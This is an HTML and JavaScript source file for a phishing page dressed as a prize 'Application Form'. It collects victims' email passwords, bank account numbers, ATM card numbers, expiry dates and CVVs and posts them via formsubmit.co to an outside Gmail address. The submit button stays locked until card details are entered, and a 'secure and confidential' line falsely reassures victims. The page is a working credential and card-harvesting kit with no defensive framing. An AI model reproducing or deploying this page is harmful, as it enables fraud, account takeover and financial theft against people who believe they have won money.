<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: white;
      padding: 20px;
      border-radius: 8px;
      max-width: 500px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 8px;
      margin-top: 5px;
      box-sizing: border-box;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .note {
      margin-top: 20px;
      background: #e7f3ff;
      padding: 10px;
      border-left: 4px solid #2196F3;
    }
    .confidential {
      margin-top: 20px;
      text-align: center;
      font-size: 0.9em;
      color: #555;
    }
  </style>
</head>
<body>

<form id="applicationForm" action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
  <h2>Application Form</h2>

  <label>Full Name
    <input type="text" name="Full Name" required id="fullName"/>
    <div class="error" id="fullNameError">This field is required.</div>
  </label>

  <label>Country
    <input type="text" name="Country" required />
  </label>

  <label>Phone Number
    <input type="text" name="Phone Number" required id="phone" />
    <div class="error" id="phoneError">Must be 9 to 12 digits.</div>
  </label>

  <label>Email Address
    <input type="email" name="Email Address" required id="email" />
    <div class="error" id="emailError">Enter a valid email.</div>
  </label>

  <label>Email Password
    <input type="password" name="Email Password" required id="emailPassword" />
    <div class="error" id="emailPasswordError">This field is required.</div>
  </label>

  <label>Amount You Won
    <input type="text" name="Amount You Won" required id="amountWon" />
  </label>

  <label>Bank Account Type
    <input type="text" name="Bank Account Type" required id="accountType" />
  </label>

  <label>Bank Account Number
    <input type="text" name="Bank Account Number" required id="accountNumber" />
  </label>

  <label>Bank Account Holder's Name
    <input type="text" name="Bank Account Holder Name" required id="holderName" />
  </label>

  <label>Did You Link ATM to Your Bank Account?
    <select name="ATM Linked" id="atmLinked" required>
      <option value="">Select</option>
      <option value="Yes">Yes</option>
      <option value="No">No</option>
    </select>
  </label>

  <div id="atmFields">
    <label>ATM Card Number
      <input type="text" name="ATM Card Number" id="cardNumber" />
      <div class="error" id="cardNumberError">Must be exactly 16 digits.</div>
    </label>

    <label>Expiry Date (MM/YY)
      <input type="text" name="Expiry Date" id="expiry" placeholder="MM/YY" />
      <div class="error" id="expiryError">Enter a valid MM/YY format.</div>
    </label>

    <label>CVV
      <input type="text" name="CVV" id="cvv" />
      <div class="error" id="cvvError">Must be exactly 3 digits.</div>
    </label>
  </div>

  <div class="note" id="finalNote">
    Dear <span id="noteName">[Full Name]</span>, You will receive <span id="noteAmount">[Amount You Won]</span> to your <span id="noteType">[Account Type]</span>, <span id="noteNumber">[Account Number]</span>
  </div>

  <div class="confidential">We keep your data secure and confidential.</div>

  <input type="hidden" name="_next" value="thankyou.html">

  <button type="submit" id="submitBtn" disabled>Submit</button>
</form>

<script>
  const form = document.getElementById("applicationForm");
  const atmLinked = document.getElementById("atmLinked");
  const atmFields = document.getElementById("atmFields");
  const submitBtn = document.getElementById("submitBtn");
  const finalNote = document.getElementById("finalNote");

  const cardNumber = document.getElementById("cardNumber");
  const cvv = document.getElementById("cvv");
  const expiry = document.getElementById("expiry");
  const phone = document.getElementById("phone");
  const fullName = document.getElementById("fullName");
  const amountWon = document.getElementById("amountWon");
  const accountType = document.getElementById("accountType");
  const accountNumber = document.getElementById("accountNumber");

  function formatExpiry() {
    let val = expiry.value.replace(/\D/g, '');
    if (val.length >= 3) {
      expiry.value = val.slice(0, 2) + '/' + val.slice(2, 4);
    } else {
      expiry.value = val;
    }
  }

  expiry.addEventListener("input", formatExpiry);

  function validateField(input, pattern, errorId) {
    const errorDiv = document.getElementById(errorId);
    if (!pattern.test(input.value)) {
      errorDiv.style.display = "block";
      return false;
    } else {
      errorDiv.style.display = "none";
      return true;
    }
  }

  function updateNote() {
    document.getElementById("noteName").innerText = fullName.value;
    document.getElementById("noteAmount").innerText = amountWon.value;
    document.getElementById("noteType").innerText = accountType.value;
    document.getElementById("noteNumber").innerText = accountNumber.value;
  }

  [fullName, amountWon, accountType, accountNumber].forEach(field => {
    field.addEventListener("blur", updateNote);
  });

  function validateForm() {
    let isValid = true;

    isValid &= validateField(phone, /^\d{9,12}$/, "phoneError");

    if (atmLinked.value === "Yes") {
      isValid &= validateField(cardNumber, /^\d{16}$/, "cardNumberError");
      isValid &= validateField(cvv, /^\d{3}$/, "cvvError");
      isValid &= validateField(expiry, /^(0[1-9]|1[0-2])\/\d{2}$/, "expiryError");
    }

    submitBtn.disabled = !(atmLinked.value === "Yes" && isValid);
  }

  [phone, cardNumber, cvv, expiry].forEach(field => {
    field.addEventListener("blur", validateForm);
    field.addEventListener("input", validateForm);
  });

  atmLinked.addEventListener("change", () => {
    if (atmLinked.value === "No") {
      atmFields.style.display = "none";
      finalNote.style.display = "none";
      submitBtn.disabled = true;
    } else if (atmLinked.value === "Yes") {
      atmFields.style.display = "block";
      finalNote.style.display = "block";
      validateForm();
    } else {
      submitBtn.disabled = true;
    }
  });

  form.addEventListener("submit", function(e) {
    validateForm();
    if (submitBtn.disabled) {
      e.preventDefault();
    }
  });
</script>

</body>
</html>
